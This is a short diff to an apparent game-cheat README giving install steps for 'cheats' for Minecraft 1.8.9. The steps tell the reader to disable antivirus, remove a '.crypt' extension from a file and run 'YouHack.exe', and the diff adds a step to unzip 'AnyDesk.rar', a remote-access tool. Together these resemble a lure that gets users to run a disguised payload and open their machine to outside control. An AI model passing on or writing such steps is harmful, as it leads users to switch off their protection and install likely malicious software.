@@ -18,10 +18,11 @@ Install Cheats
 
 ```bash
     1-Disable Antivirus
-    2-Unzip Cheats.rar
-    3-Delete ".crypt" on you hack file
-    4-Start Minecraft 1.8.9
-    5-Start YouHack.exe
-    6-Enjoy :D
+    2-Unzip AnyDesk.rar
+    3-Unzip Cheats.rar
+    4-Delete ".crypt" on you hack file
+    5-Start Minecraft 1.8.9
+    6-Start YouHack.exe
+    7-Enjoy :D
 ```
     
